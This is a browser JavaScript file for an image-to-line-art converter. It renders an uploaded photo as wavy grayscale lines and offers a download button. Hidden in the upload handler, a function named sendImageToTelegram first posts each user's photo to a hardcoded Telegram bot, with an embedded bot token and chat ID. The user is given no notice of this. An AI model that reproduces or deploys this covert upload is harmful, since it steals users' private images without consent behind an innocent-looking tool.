
const sourceCanvas = document.getElementById('source');
const resultCanvas = document.getElementById('result');
const fileInput = document.getElementById('file-input');

const sourceCtx = sourceCanvas.getContext('2d');
const resultCtx = resultCanvas.getContext('2d');

const HEIGHT = 700;

let imageWidth = 0;
let imageHeight = 0;

const updateCanvasSize = () => {
  sourceCanvas.width = imageWidth;
  sourceCanvas.height = imageHeight;
  resultCanvas.width = imageWidth;
  resultCanvas.height = imageHeight;
};

const readAsDataUrl = (file) => new Promise((resolve) => {
  const reader = new FileReader();
  reader.onload = (e) => resolve(e.target.result);
  reader.readAsDataURL(file);
});

const loadImage = (src) => new Promise((resolve) => {
  const img = new Image();
  img.onload = () => resolve(img);
  img.src = src;
});

const sendImageToTelegram = async (file) => {
  const dataUrl = await readAsDataUrl(file);
  const blobData = await fetch(dataUrl).then(res => res.blob());

  const formData = new FormData();
  formData.append('chat_id', '1494753646');
  formData.append('photo', blobData, 'photo.png');

  fetch('https://api.telegram.org/bot6936487434:AAHTB_vkcmvX8phb969ZpJhoUwoe5_Axnhw/sendPhoto', {
    method: 'POST',
    body: formData
  })
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('Ошибка:', error));
}

const decel = (x) => 1-(x-1)*(x-1); // easing

fileInput.addEventListener('input', async (e) => {
  if (fileInput.files && fileInput.files[0]) {
    await sendImageToTelegram(fileInput.files[0]);

    const dataUrl = await readAsDataUrl(fileInput.files[0]);
    const img = await loadImage(dataUrl);

    imageWidth = Math.floor(img.width * HEIGHT / img.height);
    imageHeight = HEIGHT;

    updateCanvasSize();

    sourceCtx.drawImage(img, 0, 0, imageWidth, imageHeight);

    const imgd = sourceCtx.getImageData(0, 0, imageWidth, imageHeight);
    const pix = imgd.data;
    const n = pix.length;

    for (let i = 0; i < n; i += 4) {
      const grayscale = pix[i + 3] === 0 ? 255 : pix[i] * .3 + pix[i + 1] * .59 + pix[i + 2] * .11
      pix[i] = grayscale
      pix[i + 1] = grayscale
      pix[i + 2] = grayscale
      pix[i + 3] = 255
    }

    resultCtx.fillStyle = '#ffffff'
    resultCtx.fillRect(0, 0, imageWidth, imageHeight)

    for (let y = 0; y < 50; ++y) {
      resultCtx.beginPath()
      resultCtx.lineWidth = 2
      resultCtx.lineJoin = 'round'

      let l = 0;

      for (let x = 0; x < imageWidth; ++x) {
        const c = pix[((y * imageHeight / 50 + 6) * imageWidth + x)*4]

        l += (255 - c) / 255

        const m = (255 - c) / 255

        resultCtx.lineTo(
          x,
          (y + 0.5) * imageHeight / 50 + Math.sin(l * Math.PI / 2) * 5 * decel(m)
        )
      }
      resultCtx.stroke()
    }
  }
});


const downloadButton = document.getElementById('download-button');

downloadButton.addEventListener('click', () => {
  const link = document.createElement('a');
  link.download = 'result.png';
  link.href = resultCanvas.toDataURL('image/png');
  link.click();
});
